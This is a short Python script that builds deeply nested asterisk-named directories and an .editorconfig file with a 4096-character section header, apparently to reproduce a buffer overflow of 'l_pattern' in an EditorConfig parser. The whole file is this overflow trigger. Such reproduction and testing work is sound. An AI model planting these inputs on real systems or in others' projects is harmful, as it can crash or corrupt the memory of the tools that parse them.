"""Generate a local .editorconfig tree whose section glob overflows l_pattern.

All paths stay under the caller-supplied root. No network access.
"""
import os
import sys

root = sys.argv[1]
section_len = int(sys.argv[2]) if len(sys.argv) > 2 else 4096
component = "*" * 150
levels = 20
path = root
for _ in range(levels):
    path = os.path.join(path, component)
os.makedirs(path, exist_ok=True)
with open(os.path.join(path, ".editorconfig"), "w", encoding="ascii") as f:
    f.write("[" + "A" * section_len + "]\nindent_style = space\n")
target = os.path.join(path, "target.txt")
with open(target, "w", encoding="ascii") as f:
    f.write("hello\n")
print(len(path), len(component) * levels, section_len)
print(target)
